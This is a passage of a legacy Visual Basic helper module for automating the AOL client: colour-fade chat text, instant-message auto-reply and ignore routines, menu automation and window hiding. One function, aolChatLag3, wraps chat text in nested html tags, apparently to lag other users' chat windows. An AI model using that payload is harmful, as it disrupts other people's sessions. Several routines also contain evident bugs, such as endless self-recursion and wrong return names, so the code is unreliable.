    letter$ = Mid$(word$, q, 1)
    Leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "a" Then
    If X = 1 Then Leet$ = "â"
    If X = 2 Then Leet$ = "å"
    If X = 3 Then Leet$ = "ä"
    End If
    If letter$ = "b" Then Leet$ = "b"
    If letter$ = "c" Then Leet$ = "ç"
    If letter$ = "e" Then
    If X = 1 Then Leet$ = "ë"
    If X = 2 Then Leet$ = "ê"
    If X = 3 Then Leet$ = "é"
    End If
    If letter$ = "i" Then
    If X = 1 Then Leet$ = "ì"
    If X = 2 Then Leet$ = "ï"
    If X = 3 Then Leet$ = "î"
    End If
    If letter$ = "j" Then Leet$ = ",j"
    If letter$ = "n" Then Leet$ = "ñ"
    If letter$ = "o" Then
    If X = 1 Then Leet$ = "ô"
    If X = 2 Then Leet$ = "ð"
    If X = 3 Then Leet$ = "õ"
    End If
    If letter$ = "s" Then Leet$ = "š"
    If letter$ = "t" Then Leet$ = "†"
    If letter$ = "u" Then
    If X = 1 Then Leet$ = "ù"
    If X = 2 Then Leet$ = "û"
    If X = 3 Then Leet$ = "ü"
    End If
    If letter$ = "w" Then Leet$ = "vv"
    If letter$ = "y" Then Leet$ = "ÿ"
    If letter$ = "0" Then Leet$ = "Ø"
    If letter$ = "A" Then
    If X = 1 Then Leet$ = "Å"
    If X = 2 Then Leet$ = "Ä"
    If X = 3 Then Leet$ = "Ã"
    End If
    If letter$ = "B" Then Leet$ = "ß"
    If letter$ = "C" Then Leet$ = "Ç"
    If letter$ = "D" Then Leet$ = "Ð"
    If letter$ = "E" Then Leet$ = "Ë"
    If letter$ = "I" Then
    If X = 1 Then Leet$ = "Ï"
    If X = 2 Then Leet$ = "Î"
    If X = 3 Then Leet$ = "Í"
    End If
    If letter$ = "N" Then Leet$ = "Ñ"
    If letter$ = "O" Then Leet$ = "Õ"
    If letter$ = "S" Then Leet$ = "Š"
    If letter$ = "U" Then Leet$ = "Û"
    If letter$ = "W" Then Leet$ = "VV"
    If letter$ = "Y" Then Leet$ = "Ý"
    If Len(Leet$) = 0 Then Leet$ = letter$
    Made$ = Made$ & Leet$
Next q

Call IMKeyword(Text1.text, Made$)

End Function


Sub IMIgnore(TheList As ListBox)
AOL% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(AOL%, "MDIClient")
Im% = findchildbytitle(mdi%, ">Instant Message From:")
If Im% <> 0 Then
    For findsn = 0 To TheList.ListCount
        If LCase$(TheList.List(findsn)) = LCase$(SNfromIM) Then
            BadIM% = Im%
            IMRICH% = FindChildByClass(BadIM%, "RICHCNTL")
            Call SendMessage(IMRICH%, WM_CLOSE, 0, 0)
            Call SendMessage(BadIM%, WM_CLOSE, 0, 0)
        End If
    Next findsn
End If
End Sub
Function r_Color(strin As String)
'Returns the strin Colored
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(inptxt$, numspc%, 1)
Let nextChr$ = nextChr$ + "<font color=" & """" & "#ff0000" & """" & ">"
Let newsent$ = newsent$ + nextChr$
Let nextChr$ = nextChr$ + "<font color=" & """" & "#ff8040" & """" & ">"
Let newsent$ = newsent$ + nextChr$
Let nextChr$ = nextChr$ + "<font color=" & """" & "#008080" & """" & ">"
Let newsent$ = newsent$ + nextChr$
Let nextChr$ = nextChr$ + "<font color=" & """" & "#008000" & """" & ">"
Let newsent$ = newsent$ + nextChr$
Let nextChr$ = nextChr$ + "<font color=" & """" & "#0000ff" & """" & ">"
Let newsent$ = newsent$ + nextChr$
Let nextChr$ = nextChr$ + "<font color=" & """" & "#808000" & """" & ">"
Let newsent$ = newsent$ + nextChr$
Let nextChr$ = nextChr$ + "<font color=" & """" & "#800080" & """" & ">"
Let newsent$ = newsent$ + nextChr$
Let nextChr$ = nextChr$ + "<font color=" & """" & "#000000" & """" & ">"
Let newsent$ = newsent$ + nextChr$
Let nextChr$ = nextChr$ + "<font color=" & """" & "#808080" & """" & " > """
Loop
r_Color = newsent$
End Function
Function aolChatLag3(TheText As String)
G$ = TheText$
a = Len(G$)
For W = 1 To a Step 3
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    p$ = p$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "><pre><html><pre><html><pre><html>" & r$ & "</html></pre></html></pre></html></pre>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "><pre><html>" & s$ & "</html></pre>"
Next W
ChatLag = p$
End Function
Sub ChangeCaption(HWD%, newcaption As String)
Call AOLSetText(HWD%, newcaption)
End Sub
Function AOLIMSTATIC(newcaption As String)
ANTI1% = findchildbytitle(AoLMDI(), ">Instant Message From:")
STS% = FindChildByClass(ANTI1%, "_AOL_Static")
st% = GetWindow(STS%, GW_HWNDNEXT)
st% = GetWindow(st%, GW_HWNDNEXT)
Call ChangeCaption(st%, newcaption)
End Function
Function SNfromIM()

AOL% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(AOL%, "MDIClient") '

Im% = findchildbytitle(mdi%, ">Instant Message From:")
If Im% Then GoTo Greed
Im% = findchildbytitle(mdi%, "  Instant Message From:")
If Im% Then GoTo Greed
Exit Function
Greed:
IMCap$ = GetCaption(Im%)
TheSN$ = Mid(IMCap$, InStr(IMCap$, ":") + 2)
SNfromIM = TheSN$

End Function



Sub KillModal()
modal% = FindWindow("_AOL_Modal", vbNullString)
Call SendMessage(modal%, WM_CLOSE, 0, 0)
End Sub

Sub waitforok()
Do
DoEvents
okw = FindWindow("#32770", "America Online")
If proG_STAT$ = "OFF" Then
Exit Sub
Exit Do
End If

DoEvents
Loop Until okw <> 0
   
    okb = findchildbytitle(okw, "OK")
    okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
    oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)


End Sub

Function Black_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(F, F, F - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function



Function YellowPinkYellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(78, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Function WhitePurpleWhite(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Function LBlue_Green_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Function LBlue_Yellow_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (Msg)
End Function

Function Purple_LBlue_Purple()
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (Msg)
End Function

Function DBlue_Black_DBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 450 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (Msg)
End Function

Function DGreen_Black(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(0, F - F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (Msg)
End Function



Function LBlue_Orange(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(255 - F, 155, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function



Function LBlue_Orange_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 155, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (Msg)
End Function

Function LGreen_DGreen(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 220 / a
        F = E * b
        G = RGB(0, 375 - F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (Msg)
End Function

Function LGreen_DGreen_LGreen(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 490 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 375 - F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (Msg)
End Function

Function LBlue_DBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(355, 255 - F, 55)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (Msg)
End Function

Function LBlue_DBlue_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(355, 255 - F, 55)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Function PinkOrange(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 200 / a
        F = E * b
        G = RGB(255 - F, 167, 510)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Function PinkOrangePink(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 490 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 167, 510)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function

Function PurpleWhite(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 200 / a
        F = E * b
        G = RGB(255, F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (Msg)
End Function

Function PurpleWhitePurple(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function
Function YellowBlack(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(0, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   SendChat (Msg)
End Function

Function YellowBlue(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(F, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   SendChat (Msg)
End Function

Function YellowGreen(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(0, 255, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   SendChat (Msg)
End Function

Function YellowPurple(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(F, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   SendChat (Msg)
End Function



Function YellowRedYellow(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   YellowRedYellow = (Msg)
   
End Function
Function YellowRed(text As String)
    a = Len(text)
    For b = 1 To a
        C = Left(text, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(0, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   SendChat (Msg)
End Function
Function Yellow_LBlue_Yellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function
Sub BoldWavY(TheText)

G$ = TheText
a = Len(G$)
For W = 1 To a Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<sup>" & r$ & "<B></sup>" & U$ & "<sub>" & s$ & "</sub>" & T$
Next W
BoldWavY (Msg)


End Sub

Sub CenterForm(F As Form)
F.Top = (Screen.Height * 0.85) / 2 - F.Height / 2
F.Left = Screen.Width / 2 - F.Width / 2
End Sub
Sub RespondIM(message)
'This finds an IM sent to you, answers it with a
'message of "message", sends it and then closes the
'IM window
AOL% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(AOL%, "MDIClient")

Im% = findchildbytitle(mdi%, ">Instant Message From:")
If Im% Then GoTo Greed
Im% = findchildbytitle(mdi%, "  Instant Message From:")
If Im% Then GoTo Greed
Exit Sub
Greed:
E = FindChildByClass(Im%, "RICHCNTL")

E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)

E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
e2 = GetWindow(E, GW_HWNDNEXT) 'Send Text
E = GetWindow(e2, GW_HWNDNEXT) 'Send Button
Call SendMessageByString(e2, WM_SETTEXT, 0, message)
ClickIcon (E)
Call Timeout(0.8)
Im% = findchildbytitle(mdi%, "  Instant Message From:")
E = FindChildByClass(Im%, "RICHCNTL")
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT) 'cancel button...
'to close the IM window
ClickIcon (E)
End Sub

Function MessageFromIM()
AOL% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(AOL%, "MDIClient")

Im% = findchildbytitle(mdi%, ">Instant Message From:")
If Im% Then GoTo Greed
Im% = findchildbytitle(mdi%, "  Instant Message From:")
If Im% Then GoTo Greed
Exit Function
Greed:
imtext% = FindChildByClass(Im%, "RICHCNTL")
IMmessage = GetText(imtext%)
SN = SNfromIM()
snlen = Len(SNfromIM()) + 3
Blah = Mid(IMmessage, InStr(IMmessagge, SN) + snlen)
MessageFromIM = Left(Blah, Len(Blah) - 1)
End Function

Sub RunMenu(menu1 As Integer, menu2 As Integer)
Dim AOLWorks As Long
Static Working As Integer

AOLMenus% = GetMenu(FindWindow("AOL Frame25", vbNullString))
AOLSubMenu% = GetSubMenu(AOLMenus%, menu1)
AOLItemID = GetMenuItemID(AOLSubMenu%, menu2)
AOLWorks = CLng(0) * &H10000 Or Working
ClickAOLMenu = SendMessageByNum(FindWindow("AOL Frame25", vbNullString), 273, AOLItemID, 0&)

End Sub

Sub RunMenuByString(Application, StringSearch)
ToSearch% = GetMenu(Application)
MenuCount% = GetMenuItemCount(ToSearch%)

For FindString = 0 To MenuCount% - 1
ToSearchSub% = GetSubMenu(ToSearch%, FindString)
MenuItemCount% = GetMenuItemCount(ToSearchSub%)

For getstring = 0 To MenuItemCount% - 1
SubCount% = GetMenuItemID(ToSearchSub%, getstring)
MenuString$ = String$(100, " ")
GetStringMenu% = GetMenuString(ToSearchSub%, SubCount%, MenuString$, 100, 1)

If InStr(UCase(MenuString$), UCase(StringSearch)) Then
MenuItem% = SubCount%
GoTo MatchString
End If

Next getstring

Next FindString
MatchString:
RunTheMenu% = SendMessage(Application, WM_COMMAND, MenuItem%, 0)
End Sub



Sub Upchat()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOModal% = FindChildByClass(AOL%, "_AOL_Modal")
AOGauge% = FindChildByClass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
Call EnableWindow(AOL%, 1)
Call EnableWindow(Upp%, 0)
End Sub
Sub UnUpchat()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOModal% = FindChildByClass(AOL%, "_AOL_Modal")
AOGauge% = FindChildByClass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
Call EnableWindow(Upp%, 1)
Call EnableWindow(AOL%, 0)
End Sub

Sub HideAOL()
AOL% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(AOL%, 0)
End Sub

Sub ShowAOL()
AOL% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(AOL%, 5)
End Sub
